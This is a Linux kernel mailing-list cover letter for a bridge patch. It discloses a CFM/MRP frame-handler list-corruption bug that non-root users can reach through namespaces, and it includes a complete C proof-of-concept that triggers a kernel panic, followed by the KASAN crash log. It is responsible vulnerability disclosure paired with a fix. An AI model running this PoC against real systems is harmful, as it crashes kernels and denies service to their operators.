Received: from mail-pl1-f177.google.com (mail-pl1-f177.google.com [209.85.214.177])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 71A593446CE
	for <bridge@lists.linux.dev>; Thu,  3 Sep 2026 06:56:31 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.177
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788418595; cv=none; b=YYZxVNo44DKhakkvAvlC3M8+1uaBrhxmXaCmYUIMu7xpa61kNmwFFgHKd09pu6CquXsMvY05ng9ZjM3EV1zAUTJl+CUGSe3l/4dHG40fjpB3TPaLic8bsPEpP8DE3JTYNNyGx/w4LmC1/hgMcxpBxactDGU6/1sA4c0SiDHSbLg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788418595; c=relaxed/simple;
	bh=YWEeZjixVWPbIx6pRKCRue6vk69uq8xogqCfwN3kqPg=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=fqgNAnc4JNPdYl807XiCuEKYN/e82XZPLsUgZj3I+6l2pRMXXmK0yaRyDD4euyybbC2B1kSA6GITso3Q+YIY86T/qiIbwFASDzlczoEJT7WEYgILkCSAnxxCA7MAqzub/Y3Cnp9alZvDm68Xk2c8xDO1fiTuWDgMuXTcA0RW0D4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=XOlaJ1+K; arc=none smtp.client-ip=209.85.214.177
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="XOlaJ1+K"
Received: by mail-pl1-f177.google.com with SMTP id d9443c01a7336-2d9201076b3so24926125ad.0
        for <bridge@lists.linux.dev>; Wed, 02 Sep 2026 23:56:31 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788418590; x=1789023390; darn=lists.linux.dev;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=G1Xussm7AqXwON2Kivp1jwCDIHvKKgPyAF+QvpnYqRE=;
        b=XOlaJ1+KHAsDemZZwltUgnNdJxPQxkNxZKtwLvyLeGbIP/VDrojXODiTGuUZjbdVdM
         tBmEex1uuf/JptGQB/h/o0b+Mpru2Bf8ojYgU9TyRBCfhGYrZDwuitf+ZumG+6na5E3P
         HrHh7qMqJuUOkE7JkVbJoY/SX/znDc4Nn3yXXiiv08uVcsfsyfbRHOOThnnOZTk2fS9/
         ZsYOaxYBD7fFP2JlD/2TYs0l2O6dOgJjz2nxGXIHZG+oSyEyV/8LjDEC28puPBAC4hfa
         0ntfMESNR1EHBXU0JDA0cZu5EKFlJ160g+fTw9jH1t150lR5I/vDYlQmA5F2oJFYJsVi
         nbvA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788418590; x=1789023390;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=G1Xussm7AqXwON2Kivp1jwCDIHvKKgPyAF+QvpnYqRE=;
        b=RTvJPJafE1exp8rp8dbS3J5+yvXvhYjV2l45M/wncYSw24cwrSo4T5qB5c6uP8X0A2
         9xC126RVwd+hyssmDbwisft/EQUB69ACAK9TzzGeydDHbYnV+MwTtnO72v4e7mJBVnq/
         D/wRhTIZc6rqntBZGa4AwyX0sYnETQcc8r6w496k4Zhes8BwvTcxSFh/KZ4i8yP82K59
         1lfY0LoMGaUrk+9KrM73I4xiZSYlKJfXVB6PD0X/Hh2HBKuYHtvDHzhwrl3yidsO/Qpy
         DnoTYYC5jEI7hH+WqaH0b1P3XiEeCJt4jDTkmJrBf2Ovhq5QmpnelK2mWFVxAGSl3+Nt
         Ru3Q==
X-Forwarded-Encrypted: i=1; AKwUvBxFYLKbYi5av2SBfQwuqVKuX5Ux5EbsQKzeSVKJ5KJDCBzs/etkE3l7gagMjgFHBLLU9SavyJQ=@lists.linux.dev
X-Gm-Message-State: AFuF++ldu42XA1SoLhyOMOUVyv3SKVdRg8qD+/yZdLC3UC0t9imrYlxK
	5ae5FqudlepIRRi0l1awGqQgo/SxHq6A5eNPSlPxZgMOnMHarsszQQqGXYKdelBwbxVk
X-Gm-Gg: AYBFou34ok06d7n0aAIsh7D5zgZN+SETL8K3Wst9SjfQD6xjNZvTY/xY0AGXrIhsu3t
	x5mJaegBSrj9rtqGuqtkmarfSvGF/LBUxIqM+BwfDER8rf7dcvGOTDtoJkstHFiXaNgnwGGM/MA
	tGBkoSUtpZzvxEiKaB9ESiEwn7R7Cjb4d/w+pHjJL87tI0DeNNTVgJaUBJElaVNP255ybeSqVgG
	IaUHGJFZygFdBf+AwTXllnUHOzazLbcPIGE95aEnDSill2ig106UzFgBnrQCaDhyLXhddj+onLZ
	1EFDY3NCYHngM3pvfbJBMN0E7f7L50SopfELTnsVlFU6slI2utVTKOo4P9ss2Ki+TAFrkNeClcQ
	HHZcto7EUf49E3551lxxIhcBDWXFauc2x0Xueb08BOXEaiu9IreoN4YFI8dvfkpRT0nDMBKdQem
	SsLb42nDrN1o0DjjsirFPCuDA+hhVpIrwL7afbHzSAGL/eqND/KHJt10SD1I3o1iYbvMhjLe1rP
	8oF
X-Received: by 2002:a17:902:d2ca:b0:2da:dcd8:713d with SMTP id d9443c01a7336-2daec74dac6mr142924275ad.15.1788418589760;
        Wed, 02 Sep 2026 23:56:29 -0700 (PDT)
Received: from Roxy.localdomain ([203.175.14.32])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2dafe62dbc7sm5443565ad.28.2026.09.02.23.56.25
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 02 Sep 2026 23:56:28 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: razor@blackwall.org,
	bridge@lists.linux.dev,
	netdev@vger.kernel.org
Cc: idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	henrik.bjoernlund@microchip.com,
	horatiu.vultur@microchip.com,
	vega@nebusec.ai,
	zylzyl2333@gmail.com,
	zhilinz@nebusec.ai
Subject: [PATCH net v3 0/1] net: bridge: use option bits for CFM/MRP frame handlers
Date: Thu,  3 Sep 2026 14:56:13 +0800
Message-ID: <cover.1788417901.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: bridge@lists.linux.dev
List-Id: <bridge.lists.linux.dev>
List-Subscribe: <mailto:bridge+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:bridge+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/bridge/br_cfm.c and
net/bridge/br_mrp.c. The bug is reachable by a non-root user via user
and net namespace.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

---- details below ----

Bug details:

CFM and MRP register a bridge frame handler when the first MEP or MRP
instance is created, and unregister it when the last instance is
deleted. The registered object is a single global br_frame_type, and it
also contains the hlist_node used by the per-bridge frame_type_list.

Because that object is global, enabling CFM or MRP on more than one
bridge inserts the same hlist_node into multiple bridge-local lists.
Unregistering the handler on one bridge then mutates list pointers that
still belong to another bridge. A later list walk or unregister on the
second bridge hits list corruption.

These handlers can only be installed once per bridge. Track their
per-bridge enable state with net_bridge option bits
(BROPT_CFM_ENABLED / BROPT_MRP_ENABLED), which already live on the Rx
hot cache line, and dispatch the matching handler directly from the
receive path when the EtherType and option bit match. Both bits are
checked together first as an unlikely case.

The generic frame_type_list and br_frame_type helpers are removed.
struct net_bridge shrinks by 8 bytes, and the checks compile out of the
fast path completely when CFM and MRP are disabled in .config.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE
#include <errno.h>
#include <linux/cfm_bridge.h>
#include <linux/if_bridge.h>
#include <linux/if_link.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static void run(const char *cmd)
{
	if (system(cmd))
		die(cmd);
}

static void nla_put_u32(char **pp, uint16_t type, uint32_t val)
{
	struct nlattr *nla = (struct nlattr *)*pp;

	nla->nla_type = type;
	nla->nla_len = NLA_HDRLEN + sizeof(val);
	memcpy(nla + 1, &val, sizeof(val));
	*pp += NLA_ALIGN(nla->nla_len);
}

static int nl_open(void)
{
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	struct sockaddr_nl addr = { .nl_family = AF_NETLINK };

	if (fd < 0)
		die("socket");
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)))
		die("bind");
	return fd;
}

static void nl_talk(int fd, struct nlmsghdr *nlh)
{
	char rbuf[4096];
	struct nlmsghdr *r;
	ssize_t n;

	nlh->nlmsg_seq = 1;
	nlh->nlmsg_pid = 0;
	if (send(fd, nlh, nlh->nlmsg_len, 0) < 0)
		die("send");
	n = recv(fd, rbuf, sizeof(rbuf), 0);
	if (n < 0)
		die("recv");
	r = (struct nlmsghdr *)rbuf;
	if (r->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *err = NLMSG_DATA(r);

		if (err->error) {
			errno = -err->error;
			die("rtnetlink");
		}
	}
}

static void cfm_mep(int fd, int br_ifindex, int port_ifindex,
		    uint32_t instance, int create)
{
	char buf[512];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct ifinfomsg *ifi;
	struct nlattr *af, *cfm, *mep;
	char *p;

	memset(buf, 0, sizeof(buf));
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ifi));
	nlh->nlmsg_type = RTM_SETLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	ifi = NLMSG_DATA(nlh);
	ifi->ifi_family = AF_BRIDGE;
	ifi->ifi_index = br_ifindex;

	p = buf + NLMSG_ALIGN(nlh->nlmsg_len);
	af = (struct nlattr *)p;
	af->nla_type = IFLA_AF_SPEC | NLA_F_NESTED;
	p += NLA_HDRLEN;
	cfm = (struct nlattr *)p;
	cfm->nla_type = IFLA_BRIDGE_CFM | NLA_F_NESTED;
	p += NLA_HDRLEN;
	mep = (struct nlattr *)p;
	mep->nla_type = (create ? IFLA_BRIDGE_CFM_MEP_CREATE :
			 IFLA_BRIDGE_CFM_MEP_DELETE) | NLA_F_NESTED;
	p += NLA_HDRLEN;

	if (create) {
		nla_put_u32(&p, IFLA_BRIDGE_CFM_MEP_CREATE_INSTANCE, instance);
		nla_put_u32(&p, IFLA_BRIDGE_CFM_MEP_CREATE_DOMAIN, BR_CFM_PORT);
		nla_put_u32(&p, IFLA_BRIDGE_CFM_MEP_CREATE_DIRECTION,
			    BR_CFM_MEP_DIRECTION_DOWN);
		nla_put_u32(&p, IFLA_BRIDGE_CFM_MEP_CREATE_IFINDEX,
			    port_ifindex);
	} else {
		nla_put_u32(&p, IFLA_BRIDGE_CFM_MEP_DELETE_INSTANCE, instance);
	}

	mep->nla_len = p - (char *)mep;
	p = (char *)mep + NLA_ALIGN(mep->nla_len);
	cfm->nla_len = p - (char *)cfm;
	p = (char *)cfm + NLA_ALIGN(cfm->nla_len);
	af->nla_len = p - (char *)af;
	p = (char *)af + NLA_ALIGN(af->nla_len);
	nlh->nlmsg_len = p - buf;
	nl_talk(fd, nlh);
}

int main(void)
{
	int fd, br0, br1, n0, n1;

	run("ip link add br0 type bridge");
	run("ip link add br1 type bridge");
	run("ip link add n0 type dummy");
	run("ip link add n1 type dummy");
	run("ip link set n0 master br0");
	run("ip link set n1 master br1");
	run("ip link set br0 up");
	run("ip link set br1 up");
	run("ip link set n0 up");
	run("ip link set n1 up");

	br0 = if_nametoindex("br0");
	br1 = if_nametoindex("br1");
	n0 = if_nametoindex("n0");
	n1 = if_nametoindex("n1");
	if (!br0 || !br1 || !n0 || !n1)
		die("if_nametoindex");

	fd = nl_open();
	/* Link the same global cfm_frame_type into both bridges. */
	cfm_mep(fd, br0, n0, 1, 1);
	cfm_mep(fd, br1, n1, 1, 1);
	/* Unregister on br0; br1 still references the shared hlist_node. */
	cfm_mep(fd, br0, n0, 1, 0);
	/* Walk/unlink the corrupted list on br1. */
	cfm_mep(fd, br1, n1, 1, 0);

	close(fd);
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  605.862227][T11347] Oops: general protection fault, probably for non-canonical address 0xfbd59c0000000024: 0000 [#1] SMP KASAN NOPTI
[  605.863199][T11347] KASAN: maybe wild-memory-access in range [0xdead000000000120-0xdead000000000127]
[  605.863982][T11347] CPU: 2 UID: 0 PID: 11347 Comm: poc Not tainted 7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
[  605.864671][T11347] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  605.865353][T11347] RIP: 0010:br_del_frame+0xde/0x1a0
[  605.865815][T11347] Code: 00 fc ff df 48 89 fa 48 c1 ea 03 80 3c 02 00 0f 85 97 00 00 00 48 b8 00 00 00 00 00 fc ff df 4c 8b 66 18 4c 89 e2 48 c1 ea 03 <80> 3c 02 00 0f 85 8a 00 00 00 49 89 1c 24 48 85 db 74 1f 48 b8 00
[  605.867084][T11347] RSP: 0018:ffa00000112af0e8 EFLAGS: 00010216
[  605.867509][T11347] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000000
[  605.868023][T11347] RDX: 1bd5a00000000024 RSI: ffffffff9096cd20 RDI: ffffffff9096cd38
[  605.868566][T11347] RBP: ffa00000112af838 R08: 0000000000000001 R09: 0000000000000000
[  605.869092][T11347] R10: 0000000000000001 R11: 000000000000004f R12: dead000000000122
[  605.869634][T11347] R13: ff1100007e26adc0 R14: ff110000769f5e74 R15: ffa00000112af190
[  605.870157][T11347] FS:  00007f331cb69780(0000) GS:ff11000184b68000(0000) knlGS:0000000000000000
[  605.870743][T11347] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  605.871164][T11347] CR2: 00007fff61e74f8c CR3: 00000000775f2000 CR4: 0000000000751ef0
[  605.871722][T11347] PKRU: 55555554
[  605.871964][T11347] Call Trace:
[  605.872179][T11347]  <TASK>
[  605.872412][T11347]  br_cfm_mep_delete+0xa1/0x150
[  605.873260][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.873769][T11347]  br_cfm_parse+0x4c6/0x1210
[  605.874083][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.874460][T11347]  ? rcu_is_watching+0x12/0xc0
[  605.874819][T11347]  ? __pfx_br_cfm_parse+0x10/0x10
[  605.875153][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.875522][T11347]  ? __lock_acquire+0x45c/0x25f0
[  605.875868][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.876775][T11347]  ? __lock_acquire+0x45c/0x25f0
[  605.877122][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.877517][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.877886][T11347]  ? __lock_acquire+0x45c/0x25f0
[  605.878224][T11347]  br_afspec+0x3d4/0x5d0
[  605.878808][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.879185][T11347]  ? __pfx_br_afspec+0x10/0x10
[  605.879545][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.879921][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.880284][T11347]  ? __lock_acquire+0x45c/0x25f0
[  605.880620][T11347]  br_setlink+0x35d/0x500
[  605.880915][T11347]  ? __pfx_br_setlink+0x10/0x10
[  605.881256][T11347]  ? stack_depot_save_flags+0x29/0x9a0
[  605.882093][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.882510][T11347]  rtnl_bridge_setlink+0x297/0x5c0
[  605.883020][T11347]  rtnetlink_rcv_msg+0x2f7/0xb20
[  605.883349][T11347]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[  605.883729][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.884101][T11347]  ? __lock_acquire+0x45c/0x25f0
[  605.884434][T11347]  netlink_rcv_skb+0x124/0x350
[  605.884812][T11347]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[  605.885171][T11347]  ? __pfx_netlink_rcv_skb+0x10/0x10
[  605.885524][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.885932][T11347]  ? netlink_deliver_tap+0x14b/0xaa0
[  605.886418][T11347]  netlink_unicast+0x471/0x780
[  605.886744][T11347]  ? __pfx_netlink_unicast+0x10/0x10
[  605.887097][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.887463][T11347]  ? __check_object_size+0x468/0x600
[  605.888052][T11347]  netlink_sendmsg+0x75e/0xc40
[  605.888387][T11347]  ? __pfx_netlink_sendmsg+0x10/0x10
[  605.888757][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.889122][T11347]  ? __import_iovec+0x33d/0x5b0
[  605.889493][T11347]  ____sys_sendmsg+0x817/0xa20
[  605.889848][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.890216][T11347]  ? __pfx_____sys_sendmsg+0x10/0x10
[  605.890574][T11347]  ? __pfx_copy_msghdr_from_user+0x10/0x10
[  605.890972][T11347]  ? __lock_acquire+0x45c/0x25f0
[  605.891307][T11347]  ___sys_sendmsg+0x104/0x190
[  605.891635][T11347]  ? __pfx____sys_sendmsg+0x10/0x10
[  605.891979][T11347]  ? find_held_lock+0x2b/0x80
[  605.892816][T11347]  ? __wake_up+0x44/0x60
[  605.893123][T11347]  __sys_sendmsg+0x124/0x1c0
[  605.893428][T11347]  ? __pfx___sys_sendmsg+0x10/0x10
[  605.893781][T11347]  ? srso_alias_return_thunk+0x5/0xfbef5
[  605.894155][T11347]  ? rcu_is_watching+0x12/0xc0
[  605.894480][T11347]  do_syscall_64+0x116/0xf80
[  605.894854][T11347]  ? irqentry_exit+0x117/0x830
[  605.895199][T11347]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  605.895588][T11347] RIP: 0033:0x7f331cbfb687
[  605.895922][T11347] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  605.897193][T11347] RSP: 002b:00007fff61e74f30 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
[  605.897758][T11347] RAX: ffffffffffffffda RBX: 00007f331cb69780 RCX: 00007f331cbfb687
[  605.898268][T11347] RDX: 0000000000000000 RSI: 00007fff61e74fc0 RDI: 0000000000000003
[  605.898787][T11347] RBP: 0000000000000003 R08: 0000000000000000 R09: 0000000000000000
[  605.899311][T11347] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000030
[  605.899842][T11347] R13: 00007fff61e75040 R14: 00007fff61e7606c R15: 00007fff61e76070
[  605.900371][T11347]  </TASK>
[  605.900580][T11347] Modules linked in:
[  605.901315][T11347] ---[ end trace 0000000000000000 ]---
[  605.904802][T11347] RIP: 0010:br_del_frame+0xde/0x1a0
[  605.905180][T11347] Code: 00 fc ff df 48 89 fa 48 c1 ea 03 80 3c 02 00 0f 85 97 00 00 00 48 b8 00 00 00 00 00 fc ff df 4c 8b 66 18 4c 89 e2 48 c1 ea 03 <80> 3c 02 00 0f 85 8a 00 00 00 49 89 1c 24 48 85 db 74 1f 48 b8 00
[  605.906503][T11347] RSP: 0018:ffa00000112af0e8 EFLAGS: 00010216
[  605.906924][T11347] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000000
[  605.907444][T11347] RDX: 1bd5a00000000024 RSI: ffffffff9096cd20 RDI: ffffffff9096cd38
[  605.907973][T11347] RBP: ffa00000112af838 R08: 0000000000000001 R09: 0000000000000000
[  605.908516][T11347] R10: 0000000000000001 R11: 000000000000004f R12: dead000000000122
[  605.909032][T11347] R13: ff1100007e26adc0 R14: ff110000769f5e74 R15: ffa00000112af190
[  605.909584][T11347] FS:  00007f331cb69780(0000) GS:ff11000184b68000(0000) knlGS:0000000000000000
[  605.910166][T11347] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  605.910614][T11347] CR2: 00007fff61e74f8c CR3: 00000000775f2000 CR4: 0000000000751ef0
[  605.911131][T11347] PKRU: 55555554
[  605.911363][T11347] Kernel panic - not syncing: Fatal exception
[  605.912674][T11347] Kernel Offset: disabled
[  605.912969][T11347] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  net: bridge: use option bits for CFM/MRP frame handlers

 net/bridge/br_cfm.c     | 11 +++--------
 net/bridge/br_device.c  |  1 -
 net/bridge/br_input.c   | 35 ++++++++++++++---------------------
 net/bridge/br_mrp.c     | 13 +++----------
 net/bridge/br_private.h | 26 +++++++++++++++-----------
 5 files changed, 35 insertions(+), 51 deletions(-)

-- 
2.43.0
